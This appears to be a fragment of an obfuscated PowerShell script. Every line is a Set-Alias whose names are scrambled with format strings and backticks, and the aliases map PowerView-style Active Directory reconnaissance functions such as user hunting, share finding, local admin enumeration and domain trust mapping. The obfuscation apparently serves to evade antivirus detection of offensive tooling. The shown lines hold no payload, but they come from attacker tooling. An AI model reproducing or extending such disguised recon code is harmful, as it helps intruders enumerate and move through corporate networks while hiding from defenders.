&("{0}{2}{1}"-f'S','s','et-Alia') ("{2}{0}{4}{3}{1}" -f'Threa','ion','Invoke-','edFunct','d') ne`W-T`HrEAD`EDF`UNc`TION
&("{0}{2}{1}"-f 'S','as','et-Ali') ("{1}{5}{2}{3}{4}{0}" -f 'r','In','oke','-UserHu','nte','v') ("{6}{1}{3}{5}{4}{2}{0}"-f 'n','inUser','o','Loca','i','t','Find-Doma')
&("{1}{0}"-f 'lias','Set-A') ("{6}{5}{4}{0}{1}{2}{3}"-f 's','s','Hun','ter','ce','o','Invoke-Pr') ("{2}{3}{0}{1}{4}"-f'n','P','Find-D','omai','rocess')
&("{1}{0}" -f 'lias','Set-A') ("{2}{3}{1}{4}{0}" -f'ter','oke','In','v','-EventHun') ("{4}{3}{1}{0}{2}"-f'v','UserE','ent','ind-Domain','F')
&("{0}{2}{1}"-f'Set-','as','Ali') ("{0}{3}{1}{2}" -f 'Inv','n','der','oke-ShareFi') ("{2}{1}{0}{3}" -f 'har','ind-DomainS','F','e')
&("{0}{1}{2}"-f'S','et-A','lias') ("{1}{4}{0}{2}{3}" -f'-','Inv','FileFin','der','oke') ("{0}{5}{1}{4}{2}{3}"-f'Find-Interest','ngDo','nS','hareFile','mai','i')
&("{0}{2}{1}" -f 'Set-Al','s','ia') ("{2}{4}{0}{1}{3}" -f'e-EnumerateLocal','Admi','In','n','vok') ("{3}{0}{1}{2}{4}"-f 'd-','DomainLocalGroup','Membe','Fin','r')
&("{0}{1}{2}" -f'Se','t-','Alias') ("{1}{0}{5}{2}{4}{3}" -f '-','Get','tDo','ainTrust','m','Ne') ("{2}{1}{3}{4}{0}" -f 't','-','Get','Domain','Trus')
&("{1}{2}{0}"-f 's','Se','t-Alia') ("{1}{4}{2}{0}{3}"-f 'us','Get-Ne','r','t','tForestT') ("{4}{0}{2}{1}{3}"-f'et-ForestT','s','ru','t','G')
&("{1}{0}{2}"-f 'Alia','Set-','s') ("{0}{1}{3}{2}"-f'Find-F','oreign','r','Use') ("{5}{4}{6}{1}{0}{3}{2}"-f 'o','F','nUser','reig','Doma','Get-','in')
&("{0}{1}" -f 'Set-','Alias') ("{2}{3}{4}{0}{1}"-f 'e','ignGroup','F','ind-F','or') ("{4}{8}{0}{5}{3}{2}{7}{1}{6}" -f 'ainF','Mem','Gro','ign','G','ore','ber','up','et-Dom')
&("{0}{1}{2}"-f 'Se','t-Alia','s') ("{3}{0}{4}{5}{2}{1}" -f 'k','nTrust','pDomai','Invo','e','-Ma') ("{0}{3}{1}{4}{2}" -f'Get','a','g','-DomainTrustM','ppin')
&("{2}{0}{1}" -f'Alia','s','Set-') ("{2}{4}{0}{3}{1}" -f 'omainPo','icy','Ge','l','t-D') ("{1}{0}{4}{3}{2}"-f 'om','Get-D','PolicyData','n','ai')
